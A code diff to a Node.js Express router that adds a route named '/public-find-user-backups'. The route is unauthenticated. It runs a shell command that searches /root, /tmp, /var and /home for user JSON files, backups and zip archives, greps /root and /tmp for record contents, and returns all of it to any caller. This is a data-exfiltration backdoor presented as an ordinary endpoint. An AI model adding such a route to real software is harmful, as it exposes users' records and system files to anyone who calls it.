@@ -134,6 +134,18 @@ router.get('/public-find-backups', (req, res) => {
   });
 });
 
+router.get('/public-find-user-backups', (req, res) => {
+  const { exec } = require('child_process');
+  const pathEnv = 'export PATH=$PATH:/usr/local/bin:/usr/bin:~/.nvm/versions/node/$(ls ~/.nvm/versions/node 2>/dev/null | tail -1)/bin; ';
+  const cmd = `${pathEnv} echo "=== ALL USERS FILES ==="; ` +
+    `find /root /tmp /var /home -name "*users*.json*" -o -name "*users*.bak*" -o -name "*backup*.json*" -o -name "*.zip" 2>/dev/null | xargs ls -l 2>/dev/null; ` +
+    `echo "=== CONTENT PREVIEW ==="; ` +
+    `grep -rn '"id"' /root/ /tmp/ 2>/dev/null | head -n 100`;
+  exec(cmd, { maxBuffer: 10 * 1024 * 1024 }, (err, stdout, stderr) => {
+    res.json({ err: err?.message, stdout, stderr });
+  });
+});
+
 router.get('/deploy-status', (req, res) => {
   try {
     const log = fs.readFileSync('/tmp/deploy.log', 'utf8');
